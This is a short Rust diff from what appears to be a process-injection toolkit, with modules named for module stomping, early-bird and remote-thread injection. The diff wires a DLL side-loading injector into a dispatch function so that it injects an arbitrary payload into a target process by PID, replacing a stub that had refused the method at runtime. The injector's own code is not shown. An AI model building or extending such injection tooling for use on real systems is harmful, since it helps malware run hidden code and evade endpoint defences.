@@ -6,6 +6,8 @@ pub mod module_stomp;
 pub mod early_bird;
 #[cfg(windows)]
 pub mod remote_thread;
+#[cfg(windows)]
+pub mod dll_sideload;
 
 #[cfg(windows)]
 #[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
@@ -45,14 +47,7 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
                 .map_err(|e| anyhow::anyhow!("{}", e))
         }
         InjectionMethod::DllSideLoad   => {
-            // DLL side-loading uses the orchestra-side-load-gen pipeline at
-            // build time to produce a benign-signed loader EXE + a sideloaded
-            // DLL containing the payload.  Runtime in-process injection is
-            // not supported for this method by design.
-            Err(anyhow::anyhow!(
-                "DllSideLoad is a build-time technique (see orchestra-side-load-gen); \
-                 not available as in-process injection"
-            ))
+            dll_sideload::DllSideLoadInjector.inject(pid, payload)
         }
     }
 }
